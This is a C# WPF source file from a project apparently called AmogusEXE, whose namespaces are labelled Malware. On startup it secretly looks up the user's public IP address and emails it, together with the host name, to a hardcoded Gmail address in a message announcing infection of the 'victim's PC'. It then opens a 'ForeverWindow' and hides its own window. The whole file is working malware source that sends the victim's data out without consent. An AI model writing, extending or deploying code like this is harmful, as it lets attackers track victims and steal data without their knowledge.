using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

using AmogusEXE.Malware.Sender;
using AmogusEXE.Malware.Encoding;
using AmogusEXE.Malware.Reader;
using System.IO;
using System.Net.NetworkInformation;
using System.Net;
using System.Text.Json;
using System.Net.Sockets;
using System.Net.Http;

namespace AmogusEXE
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            GetNecessaryStuff();
            InitializeComponent();
            new ForeverWindow();
            Close();
        }

        public static void GetNecessaryStuff()
        {
            var request = WebRequest.Create("http://checkip.dyndns.org");
            request.Method = "GET";
            using var webResponse = request.GetResponse();
            using var webStream = webResponse.GetResponseStream();
            using var reader = new StreamReader(webStream);
            string data = reader.ReadToEnd();
            string[] response = data.Split(':');
            string ip = response[1].Replace("</body></html>\r\n", "").Replace(" ", "");
            Sender.Mail("maxus.info.mail@gmail.com", $"\"AmogusEXE was initialized on victim's PC!\nUser's IPv4 Address: {ip}\nUser's DNS Name: {Dns.GetHostName()}\"");
        }
    }
}